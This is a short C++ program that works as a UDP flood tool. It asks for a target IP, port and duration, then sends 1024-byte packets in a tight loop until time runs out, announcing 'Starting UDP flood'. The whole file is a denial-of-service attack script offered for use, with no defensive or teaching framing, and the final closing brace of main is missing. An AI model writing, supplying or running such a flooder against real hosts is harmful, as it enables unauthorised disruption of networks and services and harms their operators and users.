#include <iostream>
#include <cstring>
#include <cstdlib>
#include <arpa/inet.h>
#include <ctime>
#include <unistd.h>

#define PACKET_SIZE 1024  // UDP packet size

using namespace std;

int main() {
    string target_ip;
    int target_port, attack_time;

    // Get user input
    cout << "Enter target IP: ";
    cin >> target_ip;
    cout << "Enter target port: ";
    cin >> target_port;
    cout << "Enter attack duration (in seconds): ";
    cin >> attack_time;

    // Create UDP socket
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Target address setup
    sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip.c_str());

    // Create UDP packet data
    char packet[PACKET_SIZE];
    memset(packet, 'X', sizeof(packet));

    // Start attack
    cout << "Starting UDP flood on " << target_ip << ":" << target_port << " for " << attack_time << " seconds..." << endl;
    time_t start_time = time(nullptr);

    while (time(nullptr) - start_time < attack_time) {
        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target, sizeof(target));
    }

    cout << "Attack finished." << endl;
    close(sock);
    
    return 0;  // <-- This line was probably misplaced before
